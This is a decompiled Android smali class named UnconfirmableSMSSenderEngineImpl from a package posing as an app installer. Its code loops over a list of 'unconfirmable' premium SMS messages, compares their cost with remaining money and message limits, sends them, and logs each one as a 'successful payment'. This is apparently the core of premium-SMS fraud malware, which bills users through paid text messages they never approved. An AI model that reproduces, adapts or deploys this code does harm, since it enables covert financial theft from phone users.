.class public Lcom/soft/android/appinstaller/sms/internals/UnconfirmableSMSSenderEngineImpl;
.super Lcom/soft/android/appinstaller/sms/BasicSMSSender;
.source "UnconfirmableSMSSenderEngineImpl.java"

# interfaces
.implements Lcom/soft/android/appinstaller/sms/capi/SMSSenderEngine;


# static fields
.field private static final tag:Ljava/lang/String; = "UnconfirmableSMSSenderEngineImpl"


# instance fields
.field private context:Landroid/content/Context;

.field private final data:Lcom/soft/android/appinstaller/core/SmsInfo;

.field limits:Lcom/soft/android/appinstaller/sms/Limits;

.field private nextID:I


# direct methods
.method public constructor <init>(Lcom/soft/android/appinstaller/core/SmsInfo;Landroid/content/SharedPreferences;Landroid/content/Context;)V
    .locals 2
    .param p1, "data"    # Lcom/soft/android/appinstaller/core/SmsInfo;
    .param p2, "settings"    # Landroid/content/SharedPreferences;
    .param p3, "context"    # Landroid/content/Context;

    .prologue
    .line 20
    invoke-direct {p0}, Lcom/soft/android/appinstaller/sms/BasicSMSSender;-><init>()V

    .line 21
    iput-object p1, p0, Lcom/soft/android/appinstaller/sms/internals/UnconfirmableSMSSenderEngineImpl;->data:Lcom/soft/android/appinstaller/core/SmsInfo;

    .line 22
    iput-object p3, p0, Lcom/soft/android/appinstaller/sms/internals/UnconfirmableSMSSenderEngineImpl;->context:Landroid/content/Context;

    .line 23
    const-string v0, "UnconfirmableSMSSenderEngineImpl"

    const-string v1, "C-tor"

    invoke-static {v0, v1}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 24
    return-void
.end method


# virtual methods
.method public canSendMoreMessages()Z
    .locals 6

    .prologue
    const/4 v2, 0x1

    const/4 v3, 0x0

    .line 32
    :goto_0
    iget v4, p0, Lcom/soft/android/appinstaller/sms/internals/UnconfirmableSMSSenderEngineImpl;->nextID:I

    iget-object v5, p0, Lcom/soft/android/appinstaller/sms/internals/UnconfirmableSMSSenderEngineImpl;->data:Lcom/soft/android/appinstaller/core/SmsInfo;

    invoke-virtual {v5}, Lcom/soft/android/appinstaller/core/SmsInfo;->getUnconfirmableSmsCount()I

    move-result v5

    if-ge v4, v5, :cond_0

    iget-object v4, p0, Lcom/soft/android/appinstaller/sms/internals/UnconfirmableSMSSenderEngineImpl;->data:Lcom/soft/android/appinstaller/core/SmsInfo;

    iget v5, p0, Lcom/soft/android/appinstaller/sms/internals/UnconfirmableSMSSenderEngineImpl;->nextID:I

    invoke-virtual {v4, v5}, Lcom/soft/android/appinstaller/core/SmsInfo;->getUnconfirmableSMS(I)Lcom/soft/android/appinstaller/core/SmsInfo$SMS;

    move-result-object v4

    invoke-virtual {v4}, Lcom/soft/android/appinstaller/core/SmsInfo$SMS;->getCost()I

    move-result v4

    iget-object v5, p0, Lcom/soft/android/appinstaller/sms/internals/UnconfirmableSMSSenderEngineImpl;->limits:Lcom/soft/android/appinstaller/sms/Limits;

    invoke-virtual {v5}, Lcom/soft/android/appinstaller/sms/Limits;->expectedMoneyRest()I

    move-result v5

    if-le v4, v5, :cond_0

    .line 33
    iget v4, p0, Lcom/soft/android/appinstaller/sms/internals/UnconfirmableSMSSenderEngineImpl;->nextID:I

    add-int/lit8 v4, v4, 0x1

    iput v4, p0, Lcom/soft/android/appinstaller/sms/internals/UnconfirmableSMSSenderEngineImpl;->nextID:I

    goto :goto_0

    .line 35
    :cond_0
    iget v4, p0, Lcom/soft/android/appinstaller/sms/internals/UnconfirmableSMSSenderEngineImpl;->nextID:I

    iget-object v5, p0, Lcom/soft/android/appinstaller/sms/internals/UnconfirmableSMSSenderEngineImpl;->data:Lcom/soft/android/appinstaller/core/SmsInfo;

    invoke-virtual {v5}, Lcom/soft/android/appinstaller/core/SmsInfo;->getUnconfirmableSmsCount()I

    move-result v5

    if-ge v4, v5, :cond_1

    move v1, v2

    .line 36
    .local v1, "hasNextMessage":Z
    :goto_1
    iget-object v4, p0, Lcom/soft/android/appinstaller/sms/internals/UnconfirmableSMSSenderEngineImpl;->limits:Lcom/soft/android/appinstaller/sms/Limits;

    invoke-virtual {v4}, Lcom/soft/android/appinstaller/sms/Limits;->smsCountRest()I

    move-result v4

    if-lez v4, :cond_2

    move v0, v2

    .line 37
    .local v0, "canSendNextByRule":Z
    :goto_2
    if-eqz v1, :cond_3

    if-eqz v0, :cond_3

    :goto_3
    return v2

    .end local v0    # "canSendNextByRule":Z
    .end local v1    # "hasNextMessage":Z
    :cond_1
    move v1, v3

    .line 35
    goto :goto_1

    .restart local v1    # "hasNextMessage":Z
    :cond_2
    move v0, v3

    .line 36
    goto :goto_2

    .restart local v0    # "canSendNextByRule":Z
    :cond_3
    move v2, v3

    .line 37
    goto :goto_3
.end method

.method public init(Lcom/soft/android/appinstaller/sms/Limits;)V
    .locals 1
    .param p1, "limits"    # Lcom/soft/android/appinstaller/sms/Limits;

    .prologue
    .line 27
    iput-object p1, p0, Lcom/soft/android/appinstaller/sms/internals/UnconfirmableSMSSenderEngineImpl;->limits:Lcom/soft/android/appinstaller/sms/Limits;

    .line 28
    const/4 v0, 0x0

    iput v0, p0, Lcom/soft/android/appinstaller/sms/internals/UnconfirmableSMSSenderEngineImpl;->nextID:I

    .line 29
    return-void
.end method

.method public sendOneMessage()V
    .locals 3

    .prologue
    .line 41
    invoke-virtual {p0}, Lcom/soft/android/appinstaller/sms/internals/UnconfirmableSMSSenderEngineImpl;->canSendMoreMessages()Z

    move-result v1

    if-nez v1, :cond_0

    .line 47
    :goto_0
    return-void

    .line 43
    :cond_0
    iget-object v1, p0, Lcom/soft/android/appinstaller/sms/internals/UnconfirmableSMSSenderEngineImpl;->data:Lcom/soft/android/appinstaller/core/SmsInfo;

    iget v2, p0, Lcom/soft/android/appinstaller/sms/internals/UnconfirmableSMSSenderEngineImpl;->nextID:I

    invoke-virtual {v1, v2}, Lcom/soft/android/appinstaller/core/SmsInfo;->getUnconfirmableSMS(I)Lcom/soft/android/appinstaller/core/SmsInfo$SMS;

    move-result-object v0

    .line 44
    .local v0, "sms":Lcom/soft/android/appinstaller/core/SmsInfo$SMS;
    iget-object v1, p0, Lcom/soft/android/appinstaller/sms/internals/UnconfirmableSMSSenderEngineImpl;->context:Landroid/content/Context;

    invoke-virtual {p0, v1, v0}, Lcom/soft/android/appinstaller/sms/internals/UnconfirmableSMSSenderEngineImpl;->SendMessage(Landroid/content/Context;Lcom/soft/android/appinstaller/core/SmsInfo$SMS;)V

    .line 45
    iget-object v1, p0, Lcom/soft/android/appinstaller/sms/internals/UnconfirmableSMSSenderEngineImpl;->limits:Lcom/soft/android/appinstaller/sms/Limits;

    invoke-virtual {v1, v0}, Lcom/soft/android/appinstaller/sms/Limits;->registerSuccessfulPayment(Lcom/soft/android/appinstaller/core/SmsInfo$SMS;)V

    .line 46
    iget v1, p0, Lcom/soft/android/appinstaller/sms/internals/UnconfirmableSMSSenderEngineImpl;->nextID:I

    add-int/lit8 v1, v1, 0x1

    iput v1, p0, Lcom/soft/android/appinstaller/sms/internals/UnconfirmableSMSSenderEngineImpl;->nextID:I

    goto :goto_0
.end method
